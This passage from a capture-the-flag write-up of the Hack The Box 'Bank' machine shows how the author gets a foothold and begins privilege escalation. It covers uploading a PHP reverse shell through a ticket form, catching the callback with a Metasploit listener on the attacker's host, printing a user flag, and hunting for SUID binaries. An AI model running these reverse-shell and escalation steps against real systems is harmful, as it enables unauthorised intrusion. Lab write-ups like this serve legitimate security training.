No encoder specified, outputting raw payload
Payload size: 30687 bytes
```
This time, we try uploading our `shell.htb` PHP reverse shell and it worked, with the message "Your ticket has been created successfully".

We now start a Meterpreter listener, and try to execute this payload which will most likely be on `http://bank.htb/uploads/` as we've seen from our Gobuster earlier.
```
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > show options
...
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.19:6969 
```
All that is left is to execute our shell, by navigating to `http://bank.htb/uploads/shell.htb`.
```
[*] Started reverse TCP handler on 10.10.14.19:6969 
[*] Meterpreter session 1 opened (10.10.14.19:6969 -> 10.129.29.200:57404) at 2021-01-31 21:19:13 +0800

meterpreter > getuid
Server username: www-data (33)
```
This worked! We got a Meterpreter shell successfully.

## 10. Privilege Escalation & Getting Flags
Through navigating around, we got our first flag.
```
meterpreter > cd chris
meterpreter > ls
Listing: /home/chris
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
20666/rw-rw-rw-   0     cha   2021-01-31 19:56:54 +0800  .bash_history
100644/rw-r--r--  220   fil   2017-05-29 03:13:11 +0800  .bash_logout
100644/rw-r--r--  3637  fil   2017-05-29 03:13:11 +0800  .bashrc
40700/rwx------   4096  dir   2021-01-11 20:19:00 +0800  .cache
100644/rw-r--r--  675   fil   2017-05-29 03:13:11 +0800  .profile
100444/r--r--r--  33    fil   2021-01-31 19:57:12 +0800  user.txt

meterpreter > cat user.txt
cf7e86220606b30342777eca247d9272
```
Now let's try to get our system flag.

We will attempt our usual method.
```
meterpreter > getsystem
[-] Unknown command: getsystem.

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.129.29.200 - Collecting local exploits for php/linux...
[-] 10.129.29.200 - No suggestions available.
```
Unforutantely for us, our usual method did not work.

We can use our usual method of doing more enumeration of the OS for example and finding an exploit for it.
```
meterpreter > sysinfo
Computer    : bank
OS          : Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686
Meterpreter : php/linux
```
However, this was hardly of any use. Since we know it's a Linux system, we Google for "linux privilege escalation".

There are multiple methods, but we try the first method which I've learnt in the past. SUID. Quoting our [source](https://payatu.com/guide-linux-privilege-escalation), "SUID is a feature that, when used properly, actually enhances Linux security. The problem is that administrators may unknowingly introduce dangerous SUID configurations when they install third party applications or make logical configuration changes.".

Let's give this a shot.
```
meterpreter > shell
Process 1603 created.
Channel 1 created.
        
find / -perm -u=s -type f 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```
We don't immediately see anything we could use to our untrained eye, but one does stand out. It is not normal to see files like `/var/htb/bin/emergency` having SUID privileges.

Let's explore this file.
```
```
